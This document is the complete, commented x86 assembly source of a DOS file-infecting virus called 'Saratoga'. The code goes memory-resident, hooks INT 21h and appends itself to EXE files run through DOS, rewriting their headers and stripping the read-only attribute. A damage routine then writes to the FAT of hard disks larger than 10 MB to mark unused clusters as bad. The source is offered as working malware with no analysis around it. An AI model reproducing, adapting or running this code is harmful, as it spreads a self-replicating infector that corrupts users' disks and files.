;The saratoga Virus

.RADIX 16

INT21_OFF EQU 84H 
INT21_SEG EQU 86H        



 

 
;******************************************************************************
;The following segment is the host program, which the virus has infected.
;Since this is an EXE file, the program appears unaltered, but the startup
;CS:IP in the EXE header does not point to it.

host_code       SEGMENT byte
        ASSUME CS:host_code
        ORG     0h
HOST:
        MOV     AX,4C00H                ;viral host program
        INT     21H                     ;just terminates

        db      0bh dup (0)    
        db      20H dup (0)
host_code       ENDS

vgroup          GROUP virus_code

virus_code      SEGMENT byte
        ASSUME CS:virus_code, ds:host_code

    ORG     0    
    DB      5AH
    DB      8AH,0CH
    DB      80H 
    DB      0cH  DUP (0)    
;this is where the virus starts in the file the area above is used as
; a MCB block when the virus goes tsr

;this first piece of code sets up the stack so the virus can use
;a retf later to got to the host code

START:                                          
    SUB     SP,+04H
    PUSH    BP
    MOV     BP,SP
    PUSH    AX
    MOV     AX,ES
     
    ;ADD     AX,10H
        DB      05H
HOST_CS         DW      0010H
    
    MOV     [BP+04H],AX
    
    ;MOV     [BP+02H],0000
        DB      0C7H, 46H, 02H      
HOST_IP         DW      OFFSET HOST
    
    PUSH    ES                                   ; save regs
    PUSH    DS                                   ;
    PUSH    BX                                   ;
    PUSH    CX                                   ;
    PUSH    SI                                   ;
    PUSH    DI                                   ;

;check if virsu is in memory if FF is located at 0000:37fh then it  
; is in memory and we jump to the ret_host code        

    XOR     AX,AX
    MOV     ES,AX
    CMP     BYTE PTR ES:[037FH],0FFH
    JNZ     NOT_IN_MEM

RET_HOST:
    POP     DI
    POP     SI
    POP     CX
    POP     BX
    POP     DS
    POP     ES
    POP     AX
    POP     BP
    RETF

;if virus is not in memory it jumps to here where it sets its marker that
;tells if it is in memory

NOT_IN_MEM:
    MOV     BYTE PTR ES:[037FH],0FFH


    MOV     AH,52H                          ;used int 21 52h 
    INT     21H                             ;list of list

    MOV     AX,ES:[BX-2H]                   ;LOCATION OF FIRST MCB
    MOV     ES,AX                           ;SEGMENT
    ADD     AX,ES:[03H]                     ;GET SIZE OF MEMORY BLOCK
    INC     AX                              ;CONTROLED BY THIS MCB
    INC     AX                              ;ADD 2 TO THIS
    MOV     WORD PTR CS:[0001H],AX          ;SAVE THIS VALUE IN OUR CODE
                        ;

;ADJUST OUR MCB TO BE 2MEG LESS THAN WHAT IT WAS 
;AND MOVE OUR CODE TO THIS 2MEG AREA

ASSUME  DS:HOST_CODE                    ;SO IT WILL ASSEMBLY CORRECTLY
    
    MOV     BX,DS
    DEC     BX
    MOV     DS,bX
    MOV     AL,4DH
    MOV     BYTE PTR DS:[0000H],AL
    MOV     AX,WORD PTR DS:[0003H]
    SUB     AX,80H
    MOV     WORD PTR DS:[0003H],AX
    ADD     BX,AX
    INC     BX

    MOV     ES,BX
    XOR     SI,SI
    XOR     DI,DI
    PUSH    CS
    POP     DS
    MOV     CX,7D0H
    CLD
    REPZ
    MOVSB
; CODE IS NOW IN ITS OWN MEMORY BLOCK COMPLETE WITH ITS OWN MCB WHICH SAYS
; IT PART OF COMMAND.COM - 8088
;OR IS SOMETHING CALLED I/O.SYS - 486
; NEXT PIECE OF CODE WILL PUT US IN THAT TSR MEMORY
    PUSH    ES
    MOV     AX,OFFSET HOOK_INT21
    PUSH    AX
    RETF                             

; NOW WE HOOK THE INTERRUPTS BY DIRECTLY PLAYING WITH THE INTERUPTS TABLE
;

ASSUME DS:VIRUS_CODE

HOOK_INT21:
    XOR     AX,AX
    MOV     ES,AX
    
    MOV     AX,ES:[INT21_OFF]
    MOV     CS:[OLD_INT21_OFF],AX

    MOV     AX,ES:[INT21_SEG]
    MOV     CS:[OLD_INT21_SEG],AX

    MOV     AX,CS
    MOV     ES:[INT21_SEG],AX

    MOV     AX,OFFSET VIR_INT21
    MOV     ES:[INT21_OFF],AX

    JMP     RET_HOST                ; DONE LET THE HOST PROGRAM RUN

;THIS IS THE SARATOGA INT 21 H HANDLER
;IT SIMPLY ASK 1 IS IT A 4B (EXEC) CALL 
;IF YES IT ASKED IS IT THE SECOND EXEC CALL
;IF NOT DECREMENT COUNTER AND LET DOS HANDLE THE CALL
;IF IT IS WE RESET THE COUNTER 
;AND CHECK IF IT IS A EXE FILE BEING EXEC
;IF NOT LET DOS DO ITS STUFF 
;OTHERWISE INFECT

VIR_INT21:
    CMP     AH,4BH
    JE      CONT_INF    
    
DOS_21:
    DB      0EAH

OLD_INT21_OFF       DW      ?
OLD_INT21_SEG       DW      ?

CONT_INF:
    DEC     BYTE PTR CS:[COUNTER]
    JNZ     DOS_21
    
    MOV     BYTE PTR CS:[COUNTER],02
    ;DB      90
    PUSH    AX
    PUSH    BX
    PUSH    CX
    PUSH    DX
    PUSH    SI
    PUSH    DS
    
    MOV     BX,DX

NAME_LOOP:
    INC     BX
    CMP     BYTE PTR [BX],'.'
    JE      FOUND_PERIOD
    CMP     BYTE PTR [BX],00H
    JNE     NAME_LOOP

EXIT_GOTO_DOS21:
    POP     DS
    POP     SI
    POP     DX
    POP     CX
    POP     BX
    POP     AX
    JMP     DOS_21


FOUND_PERIOD:
    INC     BX
    CMP     WORD PTR [BX],'XE'
    JNE     EXIT_GOTO_DOS21

    MOV     AX,4300H
    INT     21H
    JB      EXIT_GOTO_DOS21
;IF ARRIVED HERE THE VIRUS TRIES TO INFECT THE FILE
;FIRST CHANGING THE FILE TO READ/WRITE STATUS
;NOT SAVING OLD ATTRIBUTE
;THEN IT OPENS IT READ THE EXE HEADER THEN READS THE LAST FOUR BYTES AND 
;CHECKS FOR 50H 6FH 6FH 54H "PooT" 
; IF IT IS THERE EXIT OTHERWISE WRITE CODE TO BOTTOM OF HOST
; ALTER EXE SO IT CALLS VIRUS FIRST
; IF THIS ALL SUCCEDS THEN WE CHECK FOR HARD DRIVES GREATER THAN
;10 MEG IF FOUND MARK A UNUSED SECTOR AS BAD
; AND LET DOS DO THE REST

    MOV     AX,4301H
    AND     CX,00FEH
    INT     21H
    JB      EXIT_GOTO_DOS21

    MOV     AX,3D02H
    INT     21H
    JB      EXIT_GOTO_DOS21

    MOV     BX,AX                   ;SAVE FILE HANDLE IN BX

    PUSH    CS
    POP     DS
    
    MOV     DX,OFFSET DBUF_1
    MOV     CX,001CH
    MOV     AH,3FH
    INT     21H
    JB      close_DOS21            

    MOV     AX,ds:[H_INIT_IP]
    ;MOV     AX,ds:[29ah]
    
    MOV     WORD PTR ds:[HOST_IP],AX
    ;MOV     WORD PTR ds:[22h],AX

    MOV     AX,ds:[H_INIT_CS]
    ;MOV     AX,ds:[29cH]


    ADD     AX,0010H

       MOV     WORD PTR ds:[HOST_CS],AX
    ;MOV     WORD PTR ds:[1ah],AX


    MOV     AX,4202H
    MOV     CX,0FFFFH
    MOV     DX,0FFFCH
    INT     21H
    JB      close_DOS21

    ADD     AX,04H
    
    MOV     WORD PTR ds:[HOST_LENG],AX
    ;MOV     WORD PTR ds:[27ah],AX


    JNB     CONT1
    INC     DX
CONT1:
    MOV     WORD PTR ds:[HOST_LENG1],DX
    ;MOV     WORD PTR ds:[27ch],DX


    MOV     AH,3FH
    MOV     CX,004H
    MOV     DX,OFFSET CHECK_INF
    INT     21H
    JNB     NO_ERROR1

CLOSE_DOS21:
    MOV     AH,3EH
    INT     21H
    JMP     EXIT_GOTO_DOS21

NO_ERROR1:

    MOV     SI,OFFSET CHECK_INF
    MOV     AX,ds:[SI]
    CMP     AX,6F50H
    JNE     NOT_INFECTED
    MOV     AX,ds:[SI+02]
    CMP     AX,546FH
    JE      CLOSE_DOS21

NOT_INFECTED:
    MOV     AX,ds:[HOST_LENG]
    AND     AX,000FH
    JZ      WRITE_VIRUS

    MOV     CX,0010H
    SUB     CX,AX
    ADD     ds:[HOST_LENG],CX
    JNB     ADD_SPACE
    INC     WORD PTR ds:[HOST_LENG1]

ADD_SPACE:
    MOV     AH,40H
    INT     21H

    JB      CLOSE_DOS21

WRITE_VIRUS:
    XOR     DX,DX
    MOV     CX,OFFSET VGROUP:END_VIRUS
    MOV     AH,40H
    INT     21H

; ADJUST AND WRITE NEW EXE HEADER TO NEW HOST
    jb      close_dos21
    MOV     AX,0010H
    MOV     WORD PTR ds:[H_INIT_IP],AX

    MOV     DX,ds:[HOST_LENG1]
    MOV     AX,ds:[HOST_LENG]

    SHR     DX,1
    RCR     AX,1
    
    SHR     DX,1
    RCR     AX,1
    
    SHR     DX,1
    RCR     AX,1
    
    SHR     DX,1
    RCR     AX,1

    SUB     AX,ds:[HEADER]
    MOV     ds:[H_INIT_CS],AX
    ADD     WORD PTR ds:[HOST_LENG],OFFSET VGROUP:END_VIRUS
    JNB     CONT2
    INC     WORD PTR ds:[HOST_LENG1]

CONT2:
    MOV     AX,ds:[HOST_LENG]
    AND     AX,01FFH
    MOV     WORD PTR ds:[HLASTPS],AX
    
    MOV     DX,ds:[HOST_LENG1]
    MOV     AX,ds:[HOST_LENG]
    ADD     AX,01FFH
    JNB     CONT3
    INC     DX
CONT3:
    MOV     AL,AH
    MOV     AH,DL
    SHR     AX,1
    MOV     WORD PTR ds:[HLPCOUNT],AX

    MOV     AX,4200H
    XOR     CX,CX
    XOR     DX,DX
    INT     21H

    JB      EXIT_ERROR

    MOV     AH,40H
    MOV     DX,offset DBUF_1
    MOV     CX,1CH
    INT     21H

    JB      EXIT_ERROR
    MOV     AH,3EH
    INT     21H

    JNB     DAMAGE

EXIT_ERROR:        
    JMP     CLOSE_DOS21
    
DAMA_DATA       DW      0000H

DAMAGE: 
        MOV     AH,32
        MOV     DL,00
        INT     21H

        CMP     AL,0FFH
        JE      EX_DAMAGE

        XOR     AX,AX
        MOV     AL,[BX+04]
        INC     AX

        MOV     WORD PTR CS:[DAMA_DATA],AX
        MOV     AX,[BX+0Dh]
        DEC     AX

        MUL     WORD PTR CS:[DAMA_DATA]
        ADD     AX,[BX+0BH]

        JNB     CONT4
        INC     DX
CONT4:
        CMP     DX,00H
        JNE     GET_VER
        CMP     AX,5104H
        JBE     EX_DAMAGE
        
GET_VER:        
        PUSH    BX
        
        MOV     AH,30H
        INT     21H
        
        POP     BX
        
        CMP     AL,04
        JNB     D4_PLUS
        
        XOR     AX,AX
        MOV     AL,[BX+0F]
        JMP     D4_NEG

D4_PLUS:
        mov     ax,[bx+0F]
D4_NEG:
        ADD     AX,[BX+06]
        DEC     AX
        MOV     DX,AX

        MOV     AL,[BX]
TRY_AGAIN:                
        MOV     CX,1H
        MOV     BX,OFFSET CHECK_INF
        PUSH    CS
        POP     DS

        PUSH    AX
        PUSH    DX

        INT     25H
        POPF

        JB      EX_DAMAGE
        
        POP     DX
        POP     AX
        MOV     SI,01FEH
        
        ;THIS SHOULD BE ADJUSTED

NEXT_CLUSTER:
        MOV     BX,[SI+0282]
        CMP     BX,00H
        JE      MARK_BAD

        CMP     SI,00
        JE      NEXT1

        DEC     SI
        DEC     SI
        JMP     NEXT_CLUSTER
NEXT1:
        DEC     DX
        CMP     DX,08H
        JE      EX_DAMAGE

        JMP     TRY_AGAIN
MARK_BAD:                       
        MOV     WORD PTR ds:[SI+OFFSET check_inf],0FFF7H
        MOV     CX,1
        MOV     BX,OFFSET check_inf
        INT     26H
        POPF
EX_DAMAGE:
        JMP     EXIT_GOTO_DOS21

COUNTER         DB      2
HOST_LENG       DW      0430h
HOST_LENG1      DW      0h
FILE_INF        DB      50H, 6FH, 6FH, 54H

END_VIRUS       EQU     $


check_inf       db     01, 02, 03, 04               ;282
        

DBUF_1          DW      0                            ;286
HLASTPS         DW      0                            ;288
HLPCOUNT        DW      0                            ;28A
RELOC           DW      0                            ;28c
HEADER          DW      0                            ;28e
MINALLOC        DW      0                            ;290
MAXALLOC        DW      0                            ;292
H_INIT_SS       DW      0                            ;294
H_INIT_SP       DW      0                            ;296
CHECKSUM        DW      0                            ;298
H_INIT_IP       DW      0                            ;29A
H_INIT_CS       DW      0                            ;29C
RELOC_OFF       DW      0                            ;29E
OVER_NUM        DW      0                            ;2A0
            
VIRUS_CODE      ENDS
        END     START
        